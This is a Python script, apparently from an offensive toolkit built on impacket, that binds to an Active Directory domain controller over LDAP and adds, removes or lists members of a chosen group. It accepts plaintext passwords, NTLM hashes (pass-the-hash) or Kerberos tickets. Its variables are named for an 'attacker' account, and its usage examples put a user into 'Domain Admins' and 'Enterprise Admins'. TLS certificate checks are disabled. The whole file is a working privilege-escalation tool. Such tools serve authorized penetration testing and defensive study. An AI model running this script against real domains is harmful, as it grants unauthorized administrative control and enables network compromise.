#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import argparse
import ssl
import sys

from ldap3 import Server, Connection, Tls, SASL, KERBEROS, ALL, NTLM, MODIFY_ADD, MODIFY_DELETE
from ldap3.core.exceptions import LDAPSocketOpenError
from ldap3.core.rdns import ReverseDnsSetting
from impacket import version, logging
from impacket.examples import logger
from impacket.examples.utils import parse_credentials

def getGroupEntry(conn, baseDN, groupName):
    res = conn.search(baseDN, '(&(objectClass=group)(cn={}))'.format(groupName), attributes=['distinguishedName', 'member'])
    if len(conn.entries) < 1:
        logging.error('Couldn\'t find group "{}"'.format(groupName))
        sys.exit(1)
    elif len(conn.entries) > 1:
        logging.error('Ambiguous result. Cannot find a unique group DN')
        sys.exit(1)
    groupEntry = conn.entries[0]
    return groupEntry

def getUserEntry(conn, baseDN, sAMAccountName):
    res = conn.search(baseDN, '(&(objectClass=user)(sAMAccountName={}))'.format(sAMAccountName), attributes=['distinguishedName'])
    if len(conn.entries) < 1:
        logging.error('Couldn\'t find user "{}"'.format(sAMAccountName))
        sys.exit(1)
    elif len(conn.entries) > 1:
        logging.error('Ambiguous result. Cannot find a unique user account')
        sys.exit(1)
    userEntry = conn.entries[0]
    return userEntry

def getUserAccount(conn, userDN):
    res = conn.search(userDN, '(objectClass=user)', attributes=['sAMAccountName'])
    if res and len(conn.entries) == 1:
        return conn.entries[0].sAMAccountName
    return None

print(version.BANNER)

parser = argparse.ArgumentParser(add_help=True, description='Modifies Active Directory user groups')

parser.add_argument('identity', action='store', help='[domain/]username[:password]')
parser.add_argument('-dc-ip', required=True, action='store', metavar="ip address",
    help='IP address of the domain controller')
u_mutex_group = parser.add_mutually_exclusive_group(required=True)
u_mutex_group.add_argument('-add', action='store', metavar='USER', help='Add user to a group')
u_mutex_group.add_argument('-remove', action='store', metavar='USER', help='Remove user from a group')
u_mutex_group.add_argument('-get', action='store_true', help='List users in a group')
parser.add_argument('-group', required=True, action='store', metavar='GROUP', help='Group to modify')
parser.add_argument('-tls', action='store_true', help='Use a secure LDAP connection over TLS')
parser.add_argument('-hashes', action='store', metavar='LMHASH:NTHASH', help='Hash for LDAP auth (instead of password)')
parser.add_argument('-k', action='store_true',
    help='Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters.'
        ' If valid credentials cannot be found, it will use the'
        ' ones specified in the command line')

if len(sys.argv) == 1:
    parser.print_help()
    print('\nPassword authentication')
    print('Example: ./ADGroupMember.py \'deepwine.cl/Administrator:P@ssw0rd\' -dc 172.16.20.130 -add john.doe -group \'Domain Admins\'')
    print('\nKerberos authentication')
    print('Example: ./ADGroupMember.py \'deepwine.cl/Administrator\' -k -dc dc01.deepwine.cl -remove john.doe -group \'Enterprise Admins\'')
    sys.exit(1)

options = parser.parse_args()

logger.init()
logging.getLogger().setLevel(logging.INFO)

domain, username, password = parse_credentials(options.identity)

try:
    if domain == '':
        logging.critical('Domain should be specified!')
        sys.exit(1)

    if password == '' and username != '' and options.hashes is None and options.k is False:
        from getpass import getpass
        password = getpass("Password:")
except Exception as e:
    if logging.getLogger().level == logging.DEBUG:
        import traceback

        traceback.print_exc()
    print(str(e))
    sys.exit(1)

attacker_account  = '{}\\{}'.format(domain, username)
attacker_password = password

if options.hashes:
    attacker_password = ("aad3b435b51404eeaad3b435b51404ee:" + options.hashes.split(":")[-1]).upper()

target_group = options.group
if options.add:
    target_user = options.add
    logging.debug('Adding user {} into group "{}"'.format(target_user, target_group))
elif options.remove:
    target_user = options.remove
    logging.debug('Removing user {} from group "{}"'.format(target_user, target_group))
else: # options.get
    target_user = None
    logging.debug('Listing all users from group "{}"'.format(target_group))

logging.info('Initializing LDAP connection to {}'.format(options.dc_ip))

tls = Tls(validate=ssl.CERT_NONE, version=ssl.PROTOCOL_TLSv1_2)
if options.k:
    serv = Server(options.dc_ip, use_ssl=True, tls=tls, get_info=ALL)
    conn = Connection(serv, sasl_credentials=(ReverseDnsSetting.OPTIONAL_RESOLVE_ALL_ADDRESSES,),
        authentication=SASL, sasl_mechanism=KERBEROS)
else:
    if options.tls:
        serv = Server(options.dc_ip, use_ssl=True, tls=tls, get_info=ALL)
    else:
        serv = Server(options.dc_ip, use_ssl=False, get_info=ALL)
    logging.info('Logging in using "{}" account'.format(attacker_account))
    conn = Connection(serv, user=attacker_account, password=attacker_password, authentication=NTLM)

try:
    conn.bind()
except LDAPSocketOpenError as e:
    logging.fatal('Error connecting to server')
    sys.exit(1)

if not conn.bound:
    logging.error('Failed to bind LDAP session, please check username and password')
    sys.exit(1)

baseDN = serv.info.other['defaultNamingContext'][0]
logging.info('LDAP bind OK: "{}"'.format(baseDN))

# Find group DN
groupEntry = getGroupEntry(conn, baseDN, target_group)
groupDN = groupEntry['distinguishedName'].value
logging.info('Group to be queried: "{}"'.format(groupDN))

if options.get:
    if len(groupEntry['member']) == 0:
        logging.info('"{}" has no members'.format(target_group))
        sys.exit(0)

    logging.info('Members of group "{}":'.format(target_group))
    for memberDN in groupEntry['member']:
        sAMAccountName = getUserAccount(conn, memberDN)
        print('    {} ({})'.format(sAMAccountName, memberDN))

else:
    userEntry = getUserEntry(conn, baseDN, target_user)
    userDN = userEntry['distinguishedName'].value
    logging.info('Target account: "{}"'.format(userDN))
    if options.add:
        res = conn.modify(groupDN, {
            'member': [(MODIFY_ADD, [userDN])]
        })
        if res:
            logging.info('Success! User "{}" is now member of "{}"'.format(target_user, target_group))
        else:
            logging.error('Failed to add user to {} group.\n    Code: {} ({}), message: {}'.format(target_group,
                conn.result['result'], conn.result['description'], conn.result['message']))
    elif options.remove:
        res = conn.modify(groupDN, {
            'member': [(MODIFY_DELETE, [userDN])]
        })
        if res:
            logging.info('Success! User "{}" is no longer a member of "{}"'.format(target_user, target_group))
        else:
            logging.error('Failed to remove user from {} group.\n    Code: {} ({}), message: {}'.format(target_group,
                conn.result['result'], conn.result['description'], conn.result['message']))
